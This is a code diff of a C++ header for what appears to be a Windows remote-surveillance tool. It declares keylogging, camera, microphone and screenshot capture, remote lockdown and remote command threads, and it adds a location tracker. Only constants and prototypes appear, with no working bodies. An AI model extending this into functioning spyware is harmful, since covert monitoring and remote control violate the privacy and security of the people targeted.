@@ -10,7 +10,7 @@
 #include "../Network/ApiOperations.h"
 #include <string>
 #include <iterator>
-#include <set>
+#include <time.h>
 
 #define Camera "CAMERA"
 #define Keylog "KEYLOG"
@@ -18,15 +18,18 @@
 #define Screenshot "SCREENSHOT"
 #define Lockdown "LOCKDOWN"
 #define Command "COMMAND"
-#define DATA_ID "dataId"
+#define Location "LOCATION"
 
-#define CAMERA_CODE "a0"
-#define AUDIO_CODE "a1"
-#define SCREENSHOT_CODE "a2"
-#define KEYLOG_CODE "a3"
-#define CMD_CODE "a4"
+#define CAMERA_CODE "CA"
+#define AUDIO_CODE "AU"
+#define SCREENSHOT_CODE "SC"
+#define KEYLOG_CODE "KL"
+#define CMD_CODE "CM"
+#define LOCATION_CODE "LC"
 #define UNDEFINED_CODE ""
 #define DATA_FOLDER_PATH "temp/"
+
+#define DATA_ID "dataId"
 
 struct CompareDates {
 	bool operator() (WIN32_FIND_DATA data1, WIN32_FIND_DATA data2) const {
@@ -44,8 +47,10 @@ DWORD WINAPI initCamera(LPVOID lpParam);
 DWORD WINAPI initMic(LPVOID lpParam);
 DWORD WINAPI initRemoteLockdown(LPVOID lpParam);
 DWORD WINAPI initRemoteCommands(LPVOID lpParam);
+DWORD WINAPI initLocationTracker(LPVOID lpParam);
 DWORD WINAPI initDataManager(LPVOID lpParam);
 DWORD WINAPI initRequestManager(LPVOID lpParam);
+
 BOOL initRequest(map<string, map<string, string>> allRequests, const char* requestName, HANDLE requestHandle);
 string checkDataType(char* filename);
 string constructFilename(const char* typeCode);
